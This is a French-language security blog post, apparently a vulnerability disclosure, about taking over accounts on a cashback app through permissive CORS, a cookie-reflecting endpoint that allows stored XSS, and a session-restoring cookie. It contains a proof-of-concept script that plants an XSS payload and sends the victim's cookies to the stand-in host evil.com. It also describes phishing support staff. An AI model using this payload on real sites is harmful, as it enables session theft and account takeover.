---
title: "Prise de contrôle d'un compte de cashback en un seul clic depuis n'importe qu'elle autre site web"
description: "Comment une série de mauvaises pratiques web m’a permis de prendre le contrôle de n'importe quel compte en un seul clic, simplement en visitant un site web contenant du code malveillant"
pubDate: '2026-02-03'
heroImage: '@/assets/images/prise-de-controle-dun-compte-en-un-seul-clic-sur-nimporte-quelle-site-web.png'
---

## Mes début avec l'application

Depuis plusieurs jours je me suis intéressé à une application francaise spécialisé dans le cashback, au cours de mes premières analyses j’ai découvert plusieurs vulnérabilités critiques, dont une **IDOR**, une **Open Redirect & XSS reflected** et une **XSS stocked**. Ces failles m’ont poussé à approfondir mes connaissance sur le fonctionnement interne de la plateforme.

Une question s’est alors imposée : _Comment l’application identifie-t-elle ses utilisateurs et valide-t-elle l’attribution du cashback ?_

## Un communication inter-sites excessivement permissif

L’un des premiers comportements notables concerne la configuration CORS particulièrement permissive.
Sans entrer dans les détails techniques à ce stade, l’application autorisé des requêtes JavaScript provenant de domaines tiers, facilitant ainsi des échanges inter-sites qui peuvent représenter un risque de sécurité important comme nous allons le voir.

<figure class="text-center">
  <img
    src="/images/attack-on-cors.svg"
    alt="attack on cors"
    class="mx-auto"
  />
  <figcaption>
    Qu'est-ce que le CORS (cross-origin resource sharing) - portswigger.net
  </figcaption>
</figure>

## Un cookie créé dans de mauvaises conditions

En analysant le parcours utilisateur classique pour accéder à du cashback vers une boutique partenaire, deux endpoints ont rapidement attiré mon attention :

1. **/crossite/put_val/** - Cet endpoint accepté deux paramètres, **member_id** et **uid**, puis crée un cookie nommé crossite[**member_id**] dans lequel il stocke directement la valeur de **uid**.

2. **/crossite/get_val/** - Celui-ci renvoié la valeur du cookie précédemment stockée avec le parametre **member_id** correspondant.

> Exemple l'url suivante `https://www.disclosed.com/crossite/put_val/?member_id=dfalqsumqjfirtk86a2e68phkm&uid=6981065608542` créer le cookie **crossite6add22nupndc1leekfk7q33uip=6981065608542** et `https://www.disclosed.com/crossite/get_val/?member_id=dfalqsumqjfirtk86a2e68phkm` renvoyais **6981065608542**

Le paramètre **uid** était le plus intéressant puisque son contenu était refleté directement dans la reponse, j'ai alors injecté une balise script telle que `<script>alert(document.cookie)</script>` dans celui ci puis j'ai appeller le second point de terminaison.

![account-takeover-in-one-click-xss-screenshoot](@/assets/images/account-takeover-in-one-click-xss-screenshoot.webp)

Cela a pu confirmer la présence d’un XSS stocké, la charge s'étant exécutée avec succès depuis la valeur du cookie.

## Scénario d’attaque

Un attaquant aurait pu cibler un compte avec des permissions supérieur telles que le support de l’application grâce à un formulaire de contact dédié pour chaque compte utilisateur, prétextant qu’une redirection ne fonctionne plus et indiquant un lien comme https://www.disclosed.com/redirection/marchand/darty/. Cette étape est optionnelle mais permet de s'assurer que la victime est connectée et que le cookie contenant sa session soit exposé, puis par un lien vers n'importe quel domaine qui contient la charge utile. Voir ci-dessous.

J’ai construit un script à titre de preuve de concept qui s’exécute automatiquement au chargement de la page, qui renvoie les cookies sur un domaine contrôlé par l’attaquant et le redirige sur un site légitime.

```javascript
(async () => {
  // https://www.disclosed.com/crossite/put_val/?member_id=dfalqsumqjfirtk86a2e68phkm&uid=<script>document.write('<img src="https://evil.com/?c='+document.cookie+'" onerror=location="https://example.com" />')</script>
  await fetch(
    'https://www.disclosed.com/crossite/put_val/?member_id=dfalqsumqjfirtk86a2e68phkm&uid=%3Cscript%3Edocument.write%28%27%3Cimg%20src%3D%22https%3A%2F%2Fevil.com%3Fc%3D%27%2Bdocument.cookie%2B%27%22%20onerror%3Dlocation%3D%22https%3A%2F%2Fexample.com%22%20%2F%3E%27%29%3C%2Fscript%3E',
    {
      method: 'GET',
      credentials: 'include',
      mode: 'cors',
    }
  );

  window.location.href = 'https://www.disclosed.com/crossite/get_val/?member_id=dfalqsumqjfirtk86a2e68phkm';
})();
```

## Persistance du contrôle d'accès

J'étais sur le point de publier cet article lorsque que juste avant je me suis aperçu de la faille logique totalement insensée aggravant l'impact de la prise de contrôle du compte, je pensais dans un premier temps que la session utilisateur était uniquement liée à un cookie de session **PHPSESSID**, pour information, les cookies de session sont, comme leur nom l’indique, seulement existants durant une session de navigation Et sont supprimés dès que vous fermez votre page, mais j’avais faux en découvrant qu’un autre cookie se charge de restaurer la session même si l’utilisateur se déconnecte, change son email ou change son mot de passe.

## Conclusion

Cette attaque a été rendue possible par une mauvaise implémentation du CORS et de la gestion des cookies. Bien que l'attaque nécessite une authentification préalable et que l'utilisateur ait cliqué sur au moins un lien de redirection vers une boutique affiliée au cashback, elle demeure néanmoins trés dangereuse. Car étant difficile à prédire, n'importe quel site web peut être utilisé pour stocker et exécuter la charge JavaScript de manière discrète, redirigeant la victime dans une fraction de seconde après avoir lu ses cookies. De plus, l'attaque peut maintenir une persistance du contrôle sur le compte de la victime qu'impote ses actions.
